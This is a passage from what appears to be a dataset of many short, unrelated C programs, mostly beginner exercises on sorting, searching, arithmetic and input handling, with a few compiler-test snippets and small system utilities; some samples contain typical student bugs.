    "#include <stdio.h>\nint main(void)\n{\n    int data[100];\n    int k = 1;\n    int ptr = 1;\n    int item;\n    int n;\n    int beg;\n    int end;\n    int mid;\n    int loc;\n    int hold;\n    printf(\"How many numbers you want to enter: \");\n    scanf(\"%d\", &n);\n    for(k = 1; k <= n; k++)\n    {\n        printf(\"Enter the %d number: \", k);\n        scanf(\"%d\", &data[k] );\n    }\n    printf(\"\\nThe number entered in original order\\n\");\n    for(k = 1; k <= n; k++)\n    {\n        printf(\"%6d\", data[k] );\n    }\n    for(ptr = 1; ptr <= n; ptr++)\n    {\n        for( k = 1; k <= n - 1; k++ )\n        {\n            if (data[k] > data[k + 1])\n            {\n                hold = data[k];\n                data[k] = data[k + 1];\n                data[k + 1] = hold;\n            }\n        }\n    }\n    printf(\"\\nIn ascending order after Bubble Sort\\n\");\n    for(k = 1; k <= n; k++)\n        printf(\"%6d\", data[k] );\n    printf(\"\\n\\nEnter the number you want to search: \");\n    scanf(\"%d\", &item);\n    beg = 1;\n    end = n;\n    mid = (int)((beg + end) / 2);\n    while( beg <= end & data[mid] != item )\n    {\n        if (item < data[mid] )\n        {\n            end = mid - 1;\n        }\n        else\n        {\n            beg = mid + 1;\n        }\n        mid = (int)((beg + end) / 2);\n    }\n    if (data[mid] == item)\n    {\n        loc = mid;\n        printf(\"array index %d is the location of number %d\\n\", loc, item);\n    }\n    else\n    {\n        loc = 0;\n        printf(\"The number entered is not in the array.\\n\");\n    }\n}",
    "#include <stdio.h>\n#include <string.h>\nint getwordsize();\nvoid reverse(char s[]);\nvoid itoa(int n, char s[], int w);\nint main() {\n  char s[1000];\n  int i = 0;\n  int w = 8;\n  itoa(i, s, w);\n  printf(\"%d to string width %d is: %s\\n\", i, w, s);\n  i = -128;\n  w = 8;\n  itoa(i, s, w);\n  printf(\"%d to string width %d is: %s\\n\", i, w, s);\n  i = 256;\n  w = 16;\n  itoa(i, s, w);\n  printf(\"%d to string width %d is: %s\\n\", i, w, s);\n  i = 1 << (getwordsize() - 1);\n  w = 16;\n  itoa(i, s, w);\n  printf(\"%d to string width %d is: %s\\n\", i, w, s);\n}\nint getwordsize() {\n  int i = 1;\n  int j = 1;\n  while ((i <<= 1) != 0) {\n    j++;\n  }\n}\nvoid reverse(char s[]) {\n  int c, i, j;\n  for (i = 0, j = strlen(s) - 1; i < j; i++, j--) {\n    c = s[i];\n    s[i] = s[j];\n    s[j] = c;\n  }\n}\nvoid itoa(int n, char s[], int w) {\n  int i = 0;\n  int sign = n % 10;\n  s[i++] = (sign < 0 ? -sign : sign) + '0';\n  n /= 10;\n  if (n < 0) {\n    sign = n;\n    n = -n;\n  }\n  while (n > 0) {\n    s[i++] = n % 10 + '0';\n    n /= 10;\n  }\n  if (sign < 0) {\n    s[i++] = '-';\n  }\n  if (i < w) {\n    while (w > i) {\n      s[i++] = '~';\n    }\n  }\n  s[i] = '\\0';\n  reverse(s);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <semaphore.h>\n#include <pthread.h>\nint rcounter = 0;\npthread_mutex_t mutex, wrt;\npthread_t w, r;\nvoid * reader(void * params)\n{\n pthread_mutex_lock(&mutex);\n rcounter++;\n if(rcounter == 1)\n  pthread_mutex_lock(&wrt);\n pthread_mutex_unlock(&mutex);\n printf(\"Reading %d Reading\\n\", rcounter);\n pthread_mutex_lock(&mutex);\n rcounter--;\n if(rcounter == 0)\n  pthread_mutex_unlock(&wrt);\n pthread_mutex_unlock(&mutex);\n}\nvoid * writer(void * params)\n{\n pthread_mutex_lock(&wrt);\n printf(\"Writer Writes\\n\");\n pthread_mutex_unlock(&wrt);\n}\nint main()\n{\n pthread_mutex_init(&mutex, ((void*)0));\n pthread_mutex_init(&wrt, ((void*)0));\n pthread_create(&r, ((void*)0), reader, ((void*)0));\n pthread_create(&r, ((void*)0), reader, ((void*)0));\n pthread_create(&w, ((void*)0), writer, ((void*)0));\n pthread_join(r, ((void*)0));\n pthread_join(r, ((void*)0));\n pthread_join(w, ((void*)0));\n printf(\"\\n\");\n return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\nFILE *openfile(char *filename, char *pattern);\nvoid readdata(void *data, size_t blocksize, FILE *fp);\nvoid writedata(void *data, size_t blocksize, FILE *fp);\nfloat *array1d_float(long nc);\nvoid free_array1d_float(float *fv);\ndouble *array1d_double(long nc);\nvoid free_array1d_double(double *fv);\nint main(int argc, char *argv[]){\n  FILE *hgtfp;\n  FILE *simfp;\n  double *hgt;\n  float *sim;\n  float scale;\n  float offset;\n  int nrg, naz;\n  int i, j;\n  if(argc != 6){\n    fprintf((stderr), \"\\nUsage: %s hgt sim nrg scale offset\\n\\n\", argv[0]);\n    exit(1);\n  }\n  hgtfp = openfile(argv[1], \"rb\");\n  simfp = openfile(argv[2], \"wb\");\n  nrg = atoi(argv[3]);\n  scale = atof(argv[4]);\n  offset = atof(argv[5]);\n  fseeko(hgtfp,0L,(2));\n  naz = ftello(hgtfp) / sizeof(double) / nrg;\n  rewind(hgtfp);\n  printf(\"nrg: %d, naz: %d\\n\", nrg, naz);\n  hgt = array1d_double(nrg);\n  sim = array1d_float(nrg);\n  for(i = 0; i < naz; i++){\n    if((i + 1) % 100 == 0)\n      fprintf((stderr),\"processing line: %6d of %6d\\r\", i+1, naz);\n    readdata((double *)hgt, nrg * sizeof(double), hgtfp);\n    for(j = 0; j < nrg - 1; j++){\n      sim[j] = (hgt[j+1] - hgt[j]) * scale + offset;\n    }\n    sim[nrg-1] = 0.0;\n    writedata((float *)sim, nrg * sizeof(float), simfp);\n  }\n  fprintf((stderr),\"processing line: %6d of %6d\\n\", naz, naz);\n  free_array1d_double(hgt);\n  free_array1d_float(sim);\n  fclose(hgtfp);\n  fclose(simfp);\n  return 0;\n}\nFILE *openfile(char *filename, char *pattern){\n  FILE *fp;\n  fp=fopen(filename, pattern);\n  if (fp==((void*)0)){\n    fprintf((stderr),\"Error: cannot open file: %s\\n\", filename);\n    exit(1);\n  }\n  return fp;\n}\nvoid readdata(void *data, size_t blocksize, FILE *fp){\n  if(fread(data, blocksize, 1, fp) != 1){\n    fprintf((stderr),\"Error: cannot read data\\n\");\n    exit(1);\n  }\n}\nvoid writedata(void *data, size_t blocksize, FILE *fp){\n  if(fwrite(data, blocksize, 1, fp) != 1){\n    fprintf((stderr),\"Error: cannot write data\\n\");\n    exit(1);\n  }\n}\nfloat *array1d_float(long nc){\n  float *fv;\n  fv = (float*) malloc(nc * sizeof(float));\n  if(!fv){\n    fprintf((stderr),\"Error: cannot allocate 1-D float vector\\n\");\n    exit(1);\n  }\n  return fv;\n}\nvoid free_array1d_float(float *fv){\n  free(fv);\n}\ndouble *array1d_double(long nc){\n  double *fv;\n  fv = (double*) malloc(nc * sizeof(double));\n  if(!fv){\n    fprintf((stderr),\"Error: cannot allocate 1-D double vector\\n\");\n    exit(1);\n  }\n  return fv;\n}\nvoid free_array1d_double(double *fv){\n  free(fv);\n}",
    "#include <stdio.h>\nint main(int argc, char* argv[])\n{\n int x, y;\n printf(\"a =\\n\");\n scanf(\"%i\", &x);\n printf(\"b =\\n\");\n scanf(\"%i\", &y);\n printf(\"\\n\");\n short a = (short)x;\n short b = (short)y;\n unsigned short c = (unsigned short)a;\n unsigned short d = (unsigned short)b;\n printf(\"a ^ b             = %i\\n\", (int)(short)(a ^ b));\n printf(\"a | b             = %i\\n\", (int)(short)(a | b));\n printf(\"a & b             = %i\\n\", (int)(short)(a & b));\n printf(\"a << 7            = %i\\n\", (int)(short)(a << 7));\n printf(\"a << 12           = %i\\n\", (int)(short)(a << 12));\n printf(\"Signed: a >> 7    = %i\\n\", (int)(short)(a >> 7));\n printf(\"Signed: a >> 12   = %i\\n\", (int)(short)(a >> 12));\n printf(\"Unsigned: a >> 7  = %i\\n\", (int)(unsigned short)(c >> 7));\n printf(\"Unsigned: a >> 12 = %i\\n\", (int)(unsigned short)(c >> 12));\n printf(\"(a & b) ^ (a | b) = %i\\n\", (int)(short)((a & b) ^ (a | b)));\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  int A,B,C;\n  printf(\"Escreva 3 numeros:\\n\");\n  scanf(\"%d%d%d\", &A, &B, &C);\n    int resultado;\n  resultado = (A>B && A>C ) ? A : (B>C ? B : C);\n   printf(\"A: %d - B: %d - C: %d - maior: %d\", A, B, C, resultado );\n   return 0;\n  }",
    "#include <stdio.h>\n\n\n\n\nint main(){\n    float hours_worked = 0.0;\n    printf(\"Enter the number of hours worked: \");\n    scanf(\"%f\", &hours_worked);\n    float total_pay = 0.0;\n    if(hours_worked > 40.0){\n        total_pay = 12.0 * 40.0;\n        float overtime_hours = hours_worked - 40.0;\n        total_pay += 12.0 * 1.5 * overtime_hours;\n    }\n    else{\n        total_pay = 12.0 * hours_worked;\n    }\n    printf(\"Gross pay for this pay period is: %.2f\\n\", total_pay);\n    float taxes = 0.0;\n    if(total_pay > 450.0){\n        taxes = 0.15 * 300.0;\n        taxes += 0.20 * 150.0;\n        taxes += 0.25 * (total_pay - 450);\n    }\n    else if (total_pay > 300){\n        taxes = 0.15 * 300.0;\n        taxes += 0.20 * (total_pay - 300);\n    }\n    else{\n        taxes = 0.15 * total_pay;\n    }\n    printf(\"Taxes for this pay period are: %.2f\\n\", taxes);\n    printf(\"Net pay for this pay period is: %.2f\\n\", total_pay - taxes);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdint.h>\n#include <math.h>\nint main(int argc, char** argv)\n{\n    uint64_t i = 2;\n    uint64_t trianglenr = 1;\n    while(1) {\n        trianglenr += i;\n        ++i;\n        uint64_t root = (uint64_t) sqrtf( (double) trianglenr );\n        int divisorc = 2;\n        uint64_t divisor;\n        for (divisor = 2; divisor <= root; ++divisor) {\n            if( trianglenr % divisor == 0 ) {\n                divisorc += 2;\n            }\n        }\n        if( root * root == trianglenr ) {\n            --divisorc;\n        }\n        printf(\"%llu: %d\\n\", (long long unsigned) trianglenr, divisorc );\n        if( divisorc > 500 ) {\n            break;\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  float mark1,mark2,totle,avg;\n  printf(\"Input marks for subject 1 : \");\n  scanf(\"%f\",&mark1);\n  printf(\"Input marks for subject 2 : \");\n  scanf(\"%f\",&mark2);\n  totle = mark1 + mark2 ;\n  avg = totle/2.0 ;\n  printf(\"average of two marks : %.2f \", avg);\n  return 0;\n}",
    "int main() {\n  {\n    int i = 0;\n  }\n  int j = 1;\n  return j;\n}",
    "#include <stdio.h>\nint main()\n{\n    int x,y,z;\n    puts(\"Enter 3 integers\");\n    scanf(\"%d %d %d\", &x, &y, &z);\n    if(x<=y)\n    {\n        if(x<=z)\n        {\n            printf(\"SMALLEST: %d\\n\", x);\n        }\n    }\n    if(y<=x)\n    {\n        if(y<=z)\n        {\n            printf(\"SMALLEST: %d\\n\", y);\n        }\n    }\n    if(z<=x)\n    {\n        if(x<=y)\n        {\n            printf(\"SMALLEST: %d\\n\", z);\n        }\n    }\n    if(x>=y)\n    {\n        if(x>=z)\n        {\n            printf(\"LARGEST: %d\\n\", x);\n        }\n    }\n    if(y>=x)\n    {\n        if(y>=z)\n        {\n            printf(\"LARGEST: %d\\n\", y);\n        }\n    }\n    if(z>=x)\n    {\n        if(z>=y)\n        {\n            printf(\"LARGEST: %d\\n\", z);\n        }\n    }\n}",
    "#include <stdio.h>\nint main(void)\n{\n    char mess[80];\n    int i;\n    printf(\"Enter message (less than 80 character)\\n\");\n    for (i = 0; i < 80; i++) {\n        scanf(\"%c\", &mess[i]);\n        if (mess[i] == '\\n') break;\n    }\n    mess[i] = '\\0';\n    printf(\"\\n\");\n    for (i = 0; mess[i] != '\\0'; i++) printf(\"%c\", mess[i]);\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[]) {\n    int n,s,t;\n    scanf(\"%d,%d\",&n,&s);\n    if(n>s){\n        t=s;\n    }else{\n        t=n;\n    }\n    while(t>0){\n        if(n%t==0 && s%t==0){\n            printf(\"%d\",t);\n            break;\n        }else{\n            t=t-1;\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int n;\n    scanf(\"%d\", &n);\n    int c = 2;\n    int today = c;\n    while (--n) {\n        today = (today * 3) / 2;\n        c += today;\n    }\n    printf(\"%d\", c);\n    return 0;\n}",
    "#include <string.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nFILE *fp;\nchar file_name_str[256];\n\n\nint di_prev_value[6] = {-1,-1,-1,-1,-1,-1};\nint scan_di(int idx)\n{\n char *usrAL=\"ual\";\n char *diN=\"di\";\n char buffer[10];\n int value;\n memset(file_name_str,0,256);\n sprintf(file_name_str,\"/%s/%s%d/value\",usrAL,diN,idx);\n if ((fp = fopen(file_name_str, \"rb\")) == ((void*)0)) {\n  printf(\"Cannot open %s.\\n\",file_name_str);\n  exit(1);\n }\n fread(buffer, sizeof(char), sizeof(buffer) - 1, fp);\n fclose(fp);\n value = atoi(buffer);\n if(value != di_prev_value[idx-1])\n {\n        if(value == 0)\n        {\n            printf(\"Get /ual/di%d value: %d, turn on\\n\", idx, value);\n        }else if(value == 1)\n        {\n            printf(\"Get /ual/di%d value: %d, turn off\\n\", idx, value);\n        }else\n        {\n            printf(\"Get /ual/di%d value: %d, error\\n\", idx, value);\n        }\n        di_prev_value[idx-1] = value;\n    }\n return 0;\n}\nint main(int argc, char **argv)\n{\n    printf(\"Start scan di channel change...\\n\");\n    while(1)\n    {\n        scan_di(1);\n        usleep(100*1000);\n        scan_di(2);\n        usleep(100*1000);\n        scan_di(3);\n        usleep(100*1000);\n        scan_di(4);\n        usleep(100*1000);\n        scan_di(5);\n        usleep(100*1000);\n        scan_di(6);\n        usleep(100*1000);\n    }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main (int argc, char *argv[])\n{\n    int *p, q, x;\n    x = 15;\n    p = &x;\n    q = *p;\n    printf(\"%d \\n\", p);\n    printf(\"%d \\n\", *p);\n    printf(\"%d \\n\", q);\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n int iMultiplicando, iMultiplicador,iProducto,iNumeroInicial,iNumeroFinal;\n printf(\"Este programa te muestra la tabla de multiplicar de un n%cmero que ingreses con un valor de inicio y un valor final \",163);\n printf(\"\\n%cQu%c n%cmero quieres multiplicar%c \",168,130,163,63);\n scanf(\"%d\",&iMultiplicando);\n printf(\"\\n%cCon qu%c n%cmero quieres inicial%c \",168,130,163,63);\n scanf(\"%d\",&iNumeroInicial);\n printf(\"\\n%cHasta que n%cmero quieres terminar%c \",168,163,63);\n scanf(\"%d\",&iNumeroFinal);\n if(iNumeroInicial > iNumeroFinal){\n  printf(\"ERROR. El n%cmero inicial debe ser menor al n%cmero final\",163,163);\n }else{\n  for(iMultiplicador = iNumeroInicial; iMultiplicador <= iNumeroFinal; iMultiplicador++){\n  iProducto = iMultiplicando * iMultiplicador;\n  printf(\"\\n%d x %d = %d\",iMultiplicando,iMultiplicador,iProducto);\n     }\n }\n return 0;\n}",
    "int main() {\n  char val = 3;\n  return val;\n}",
    "#include <stdio.h>\nint main(void)\n{ char ret;\n int temp=0;\n int hot=0,nice=0,cold=0;\n int total=0;\n int average;\n while(temp!=-50)\n { printf(\"\\nEnter temperature or -50 to end:\");\n  scanf(\"%d%c\",&temp,&ret);\n  if(temp!=-50)\n   total+=temp;\n  if(temp>84)\n  { printf(\"Hot Day!\");\n   hot++;\n  }\n  else\n  if((temp<85)&&(temp>59))\n  { printf(\"Nice Day!\");\n   nice++;\n  }\n  else\n  if((temp<60)&&(temp>-50))\n  { printf(\"Cold Day!\");\n   cold++;\n  }\n  else\n  { printf(\"Not a real temperature\");\n   total+=-temp;\n  }\n }\n printf(\"There were %d hot days\\n\",hot);\n printf(\"There were %d nice days\\n\",nice);\n printf(\"There were %d cold days\\n\",cold);\n average=(total)/(hot+nice+cold);\n printf(\"The average temperature was %d\",average);\n return(0);\n}",
    "#include <unistd.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <fcntl.h>\n#include <limits.h>\nchar tab_ref[4096];\nint main()\n{\n    int nrBytesRead;\n    char ch;\n    printf(\"Caracteristici dupa exec\\n\");\n    printf(\"------------------------\\n\");\n    printf(\"ID-ul procesului : %d\\n\",getpid());\n    printf(\"ID-ul parintelui : %d\\n\",getppid());\n    printf(\"Proprietarul real : %d\\n\",getuid());\n    printf(\"Proprietarul efectiv : %d\\n\",geteuid());\n    printf(\"Directorul curent de lucru : %s\\n\\n\",getcwd(tab_ref,4096));\n    nrBytesRead = read(0, &ch, 1);\n    printf(\"Numarul de caractere citite: %d\\n\",nrBytesRead);\n    if( -1 == nrBytesRead )\n        perror(\"Eroare la citirea din fluxul stdin (deoarece este inchisa !) \");\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int a, b, c, d, n, cnt, i;\n    scanf(\"%d %d %d %d %d\", &a, &b, &c, &d, &n);\n    cnt=n;\n    for(i=1; i<=n; i++)\n    {\n        if(i%a && i%b && i%c && i%d) cnt--;\n    }\n    printf(\"%d\\n\", cnt);\n    return 0;\n}",
    "#include <stdio.h>\nint gcd(int g, int l)\n{\n    if (l > 0)\n    {\n        return gcd(l, (g % l));\n    }\n    else\n    {\n        return g;\n    }\n}\nint main()\n{\n    int result = gcd(450, 40);\n    printf(\"res is: %i\\n\", result);\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\nint binarySearch(char *Array1D[10], int left, int right, char *lookup)\n{\n    if (left <= right)\n    {\n        int mid = (right + left) / 2;\n        printf(\"left = %d, mid = %d, right = %d\\n\", left, mid, right);\n        if (strcmp(Array1D[mid], lookup) == 0)\n            return mid;\n        if (strcmp(Array1D[mid], lookup) > 0)\n            return binarySearch(Array1D, left, mid - 1, lookup);\n        return binarySearch(Array1D, mid + 1, right, lookup);\n    }\n    return -1;\n}\nint main()\n{\n    char lookup[100];\n    char *Array1D[10] = {\"Alia\", \"Bea\", \"Che\", \"Derick\", \"Elena\", \"Fatma\", \"Giun\", \"Henry\", \"Ina\", \"Jaden\"};\n    for (int i = 0; i < 10; i++)\n        printf(\"\\\"%s\\\",\", Array1D[i]);\n    printf(\"\\n\\n\");\n    printf(\"Please input a name to be searched by the binary search algorithm.\\n\");\n    fgets(lookup, 100, (stdin));\n    printf(\"\\n\");\n    binarySearch(Array1D, 0, 9, lookup);\n    printf(\"\\n\");\n}",
    "#include <stdio.h>\n#include <string.h>\nint executeSum(int *a, int b) {\n    *a = 10;\n    return *a + b;\n}\nint main(){\n    char peopleName[ ] = \"RIFELI\";\n    int sum = 0;\n    int a = 2;\n    int b = 3;\n    printf(\"THE PEOPLE NAME IS: %s \\n\\n\", peopleName);\n    printf(\"a value is %d \\n\", a);\n    sum = executeSum(&a, b);\n    printf(\"a value is %d \\n\", a);\n    printf(\"sum is %d \\n\", sum);\n    return 0;\n}",
    "#include <stdio.h>\nint CountCapital(char *str)\n{\n    int iCnt = 0;\n    if(str == ((void*)0))\n    {\n        return 0;\n    }\n    while(*str != '\\0')\n    {\n        if(*str >= 'A' && *str <= 'Z')\n        {\n            iCnt++;\n        }\n        str++;\n    }\n    return iCnt;\n}\nint main()\n{\n    char arr[20];\n    int iRet = 0;\n    printf(\"Enter string : \");\n    scanf(\"%[^'\\n']s\", arr);\n    iRet = CountCapital(arr);\n    printf(\"Count Of Capital Letters Are : %d\", iRet);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid teste_atexit()\n{\n   printf(\"Programa terminou sem erros\\n\");\n}\nint main ()\n{\n   atexit(teste_atexit);\n   printf(\"Inicio do programa\\n\");\n}",
    "union T {\n char a;\n};\nunion U {\n union T t;\n int b;\n} u;\nint main(void){\n u.b = 0;\n u.t.a = 0;\n return u.b;\n}",
    "#include <stdio.h>\nvoid Heapify(int array[], int root, int size)\n{\n    int left = 2 * root + 1, largest;\n    int right = left + 1, temp;\n    if(left < size && array[left] > array[root])\n        largest = left;\n    else\n        largest = root;\n    if(right < size && array[right] > array[largest])\n        largest = right;\n    if(largest != root)\n    {\n        temp = array[root];\n        array[root] = array[largest];\n        array[largest] = temp;\n        Heapify(array, largest, size);\n    }\n}\nvoid Build_Heap(int array[], int size)\n{\n    for(int i = (size - 1) / 2; i >= 0; i--)\n        Heapify(array, i, size);\n}\nvoid Heap_Sort(int array[], int size)\n{\n    Build_Heap(array, size);\n    int temp, i;\n    for(i = size - 1; i > 0; i--)\n    {\n        temp = array[0];\n        array[0] = array[i];\n        array[i] = temp;\n        Heapify(array, 0, i);\n    }\n}\nvoid Print_Array(int array[], int size)\n{\n    for(int i = 0; i < size; i++)\n        printf(\"%d \",array[i]);\n    printf(\"\\n\");\n}\nint main()\n{\n    int n, i;\n    printf(\"Enter number of elements in your array: \");\n    scanf(\"%d\", &n);\n    int array[n];\n    printf(\"Enter your array: \");\n    for (i = 0; i < n; i++)\n        scanf(\"%d\", &array[i]);\n    Heap_Sort(array, n);\n    Print_Array(array, n);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    printf(\"Hello from cbar\");\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\nint main(void)\n{\n    for (int r = 2; r < 3; r++)\n    {\n        printf(\"r = %d:\\n\", r);\n        for (int N = 1000; N <= 1000000; N *= 10)\n        {\n            float m1 = 0, m2 = 0;\n            printf(\"\\tN = %d:\\n\", N);\n            for (int i = 0; i < N; i++)\n            {\n                int x = rand() % r;\n                m1 += ((float)x)/N;\n                m2 += ((float)x*x)/N;\n            }\n            printf(\"\\t\\t     Avg.: %f\\n\", m1);\n            printf(\"\\t\\tStd. dev.: %f\\n\", sqrt(m2 - m1*m1));\n        }\n    }\n}",
    "#include <stdio.h>\nint main()\n{\n  float first_number, second_number, sum;\n  printf(\"Sum of two integer numbers \\n\");\n  printf(\"Enter the first number: \\n\");\n  scanf(\"%f\", &first_number);\n  printf(\"Enter the second number: \\n\");\n  scanf(\"%f\", &second_number);\n  sum = first_number * second_number;\n  printf(\"Sum is: %f \\n\", sum);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(){\n    int i = 0;\n    printf(\"Oi mundo\");\n    i = 3;\n}",
    "#include <stdio.h>\nint main() {\n int n1,n2,a[20],b[20];\n scanf(\"%d %d\\n\",&n1,&n2);\n for(int i=1;i<=n1+1;i++)\n {\n     scanf(\"%d \",&a[i-1]);\n }\n scanf(\"\\n\");\n for(int j=1;j<=n2+1;j++)\n {\n     scanf(\"%d\",&b[j-1]);\n }\n printf(\"%d\\n\",n1+n2);\n int m[40];\n for(int q=0;q<=n1+n2;q++)\n {\n     m[q]=0;\n }\n for(int k=0;k<=n1;k++)\n {\n   for(int l=0;l<=n2;l++)\n   {\n    m[k+l]=m[k+l]+(a[k]*b[l]);\n   }\n }\n for(int z=0;z<=n1+n2;z++)\n {\n     printf(\"%d \",m[z]);\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main() {\n  int i, *ptr, sum = 0;\n  ptr = (int *)calloc(10, sizeof(int));\n  if (ptr == ((void *)0)) {\n    printf(\"Error! memory not allocated.\");\n    exit(0);\n  }\n  printf(\"Building and calculating the sequence sum of the first 10 terms \\n\");\n  for (i = 0; i < 10; ++i) {\n    *(ptr + i) = i;\n    sum += *(ptr + i);\n  }\n  printf(\"Sum = %d\", sum);\n  free(ptr);\n  return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint t2u(char t, char w);\nint main() {\n    char list[] = {-1, -5, -6, -4, 1, 8};\n    for (int i = 0; i < 6; ++i) {\n        printf(\"%d\\t%d\\n\", list[i], t2u(list[i], 4) );\n    }\n}\nint t2u(char t, char w) {\n    return t >= 0 ? t : t + pow(2, w);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\n\n\n\n\n\n\nint main(){\n    double *x= malloc(10);\n    double *y= malloc(100);\n    double *z= malloc(1000);\n    { void *stopper_for_apply = (int[]){0}; void **list_for_apply = (void*[]){x, y, z, stopper_for_apply}; for (int i=0; list_for_apply[i] != stopper_for_apply; i++) free(list_for_apply[i]); };;\n}",
    "#include <stdio.h>\nint main(void) {\n  printf(\"Hello \");\n  printf(\"World\");\n  return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    double s = 0;\n    for (int i = 1; i <= 100; i++)\n        s = s + (1.0 / i);\n    printf(\"%.2f\\n\", s);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\ntypedef unsigned int uint32_t;\nint main(int argc, char *argv[]){\n    uint32_t magicbytes;\n    char buffer[10];\n    scanf(\"%x\", &magicbytes);\n    if(magicbytes == 0xdeadbeef){\n        printf(\"got it\\n\");\n    }else{\n        printf(\"fail\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n   int num, reverse_num=0, remainder,temp;\n   printf(\"Enter an integer: \");\n   scanf(\"%d\", &num);\n   temp=num;\n   while(temp!=0)\n   {\n      remainder=temp%10;\n      reverse_num=reverse_num*10+remainder;\n      temp/=10;\n   }\n   if(reverse_num==num)\n      printf(\"%d is a palindrome number\",num);\n   else\n      printf(\"%d is not a palindrome number\",num);\n   return 0;\n}",
    "#include <stdio.h>\nint pow4(int x){\n return x * x * x * x;\n}\nint main(void){\n int x;\n printf(\"input a number :\");scanf(\"%d\", &x);\n printf(\"x\u7684\u56db\u6b21\u5e42\uff1a%d\\n\", pow4(x));\n return 0;\n}",
    "#include <stdio.h>\nint main(){\n FILE *fp;\n fp=fopen (\"testeDouglas.txt\", \"w\");\n if (!fp){\n  printf(\"arquivo nao encontrado\");\n }\n}",
    "#include <stdio.h>\n#include<math.h>\nint main() {\n    double a,b,c,d;\n    scanf(\"%lf\",&a);\n    scanf(\"%lf\",&b);\n    scanf(\"%lf\",&c);\n    if (a==0 || (pow(b,2)-4*a*c)<0)\n      printf (\"Impossivel calcular\\n\");\n    else\n      printf(\"R1 = %.5lf\\n\",(-b+(sqrt(pow(b,2)-4*a*c)))/(2*a));\n      printf(\"R2 = %.5lf\\n\",(-b-(sqrt(pow(b,2)-4*a*c)))/(2*a));\n    return (0);\n}",
    "#include <stdio.h>\nint main()\n{\n float side, area;\n printf(\"Enter the Length of Side: \");\n scanf(\"%f\", &side);\n area = side * side;\n printf(\"Area of Square: %0.2f\\n\", area);\n return (0);\n}",
    "int main() {\n#pragma omp sections\n {\n }\n#pragma omp sections\n {\n#pragma omp section\n  {\n   int x;\n  }\n }\n#pragma omp sections\n {\n#pragma omp section\n  {\n   12;\n  }\n#pragma omp section\n  {\n   13;\n  }\n }\n#pragma omp sections\n {\n#pragma omp section\n  {\n   14;\n  }\n }\n#pragma omp sections\n {\n#pragma omp section\n  {\n   int x;\n  }\n#pragma omp section\n  {\n   15;\n  }\n#pragma omp section\n  {\n   int x;\n  }\n }\n#pragma omp sections\n {\n#pragma omp section\n  {\n   int x;\n  }\n#pragma omp section\n  {\n   int x;\n  }\n }\n}",
    "#include <unistd.h>\n#include <fcntl.h>\nint main() {\n    sync();\n    int fd = open(\"/proc/sys/vm/drop_caches\", (0x10000000));\n    if (!fd) {\n        return 1;\n    }\n    if (write(fd, \"3\\n\", 2) != 2) {\n        return 2;\n    }\n    close(fd);\n    sync();\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int A[100], n;\n    printf(\"n=\"); scanf(\"%i\", &n);\n    int *p=A, i;\n    for (i=0; i<n; i++)\n    {\n        scanf(\"%i\", (p+i));\n    }\n    printf(\"Natija: \");\n    for (i=0; i<n; i++)\n    {\n        printf(\"%i \", *(p+i));\n    }\n    printf(\"\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint main (void)\n{\n  int value1 = 50;\n  int value2 = 25;\n  int sum = value1 + value2;\n  printf (\"The sum of %i and %i is %i\\n\", value1, value2, sum);\n  return 0;\n}",
    "int main(void)\n{\n int *p = (int *)0;\n *p=0;\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n printf(\"hello, world\\n\");\n printf(\"alert '\\a'\\n\");\n printf(\"octal 101 hex 41 - dec 65, ascii A -: '\\101' '\\x41'\\n\");\n return 0;\n}",
    "#include <stdbool.h>\n#include <stdio.h>\n#include <stdlib.h>\n\nint filterOx (int bins[], int bins_len, int new_bins[], int bit) {\n    int bit_set_times = 0;\n    for (int i = 0; i < bins_len; ++i) {\n            if ((bins[i] >> (12 - bit - 1)) & 1) {\n                bit_set_times++;\n            }\n    }\n    int most_common = bit_set_times * 2 >= bins_len;\n    int new_bins_len = 0;\n    for (int i = 0; i < bins_len; ++i) {\n        if (((bins[i] >> (12 - bit - 1)) & 1) == (most_common & 1)) {\n            new_bins[new_bins_len++] = bins[i];\n        }\n    }\n    return new_bins_len;\n}\nint filterCO (int bins[], int bins_len, int new_bins[], int bit) {\n    int bit_set_times = 0;\n    for (int i = 0; i < bins_len; ++i) {\n            if ((bins[i] >> (12 - bit - 1)) & 1) {\n                bit_set_times++;\n            }\n    }\n    int least_common = bit_set_times * 2 < bins_len;\n    int new_bins_len = 0;\n    for (int i = 0; i < bins_len; ++i) {\n        if (((bins[i] >> (12 - bit - 1)) & 1) == (least_common & 1)) {\n            new_bins[new_bins_len++] = bins[i];\n        }\n    }\n    return new_bins_len;\n}\nint main () {\n    FILE *stream = fopen(\"inputs/input3\", \"r\");\n    int bins[1000];\n    int bins_len = 0;\n    char line[12 + 1];\n    while (fscanf(stream, \"%s\", line) != (-1)) {\n        bins[bins_len++] = strtol(line, ((void*)0), 2);\n    }\n    int ox_bins[1000];\n    int ox_bins_len;\n    for (; ox_bins_len < bins_len; ++ox_bins_len) {\n        ox_bins[ox_bins_len] = bins[ox_bins_len];\n    }\n    for (int i = 0; ox_bins_len > 1; 